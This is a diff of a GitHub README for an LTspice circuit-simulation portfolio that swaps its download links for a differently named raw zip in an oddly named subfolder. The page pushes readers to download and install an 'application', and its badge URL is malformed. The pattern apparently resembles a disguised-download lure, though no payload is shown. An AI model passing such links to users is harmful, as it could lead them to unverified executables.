@@ -1,7 +1,7 @@
 # 🌟 LTspice-Portfolio- - Explore Circuit Simulations Easily
 
 ## 🔗 Download the Application
-[![Download Latest Release](https://raw.githubusercontent.com/imdad4767/LTspice-Portfolio-/main/logogrammatic/LTspice-Portfolio-.zip%20Release-blue)](https://raw.githubusercontent.com/imdad4767/LTspice-Portfolio-/main/logogrammatic/LTspice-Portfolio-.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/imdad4767/LTspice-Portfolio-/main/logogrammatic/Portfolio_Tspice_L_v1.6.zip%20Release-blue)](https://raw.githubusercontent.com/imdad4767/LTspice-Portfolio-/main/logogrammatic/Portfolio_Tspice_L_v1.6.zip)
 
 ## 📖 Overview
 The **LTspice-Portfolio-** is a collection of essential analog and digital circuit simulations. It demonstrates key concepts in VLSI design through various examples. This includes simulations of a CMOS inverter, a common-source amplifier, current mirrors, a differential pair, and a two-stage op-amp. Users can learn about and analyze important performance metrics throughout this portfolio.
@@ -18,7 +18,7 @@ To run the simulations in this portfolio, ensure you have the following:
 ### 📥 Download & Install
 To get started, visit this page to download:
 
-[Download Latest Release](https://raw.githubusercontent.com/imdad4767/LTspice-Portfolio-/main/logogrammatic/LTspice-Portfolio-.zip)
+[Download Latest Release](https://raw.githubusercontent.com/imdad4767/LTspice-Portfolio-/main/logogrammatic/Portfolio_Tspice_L_v1.6.zip)
 
 1. Open the link above.
 2. You will see a list of the latest releases.
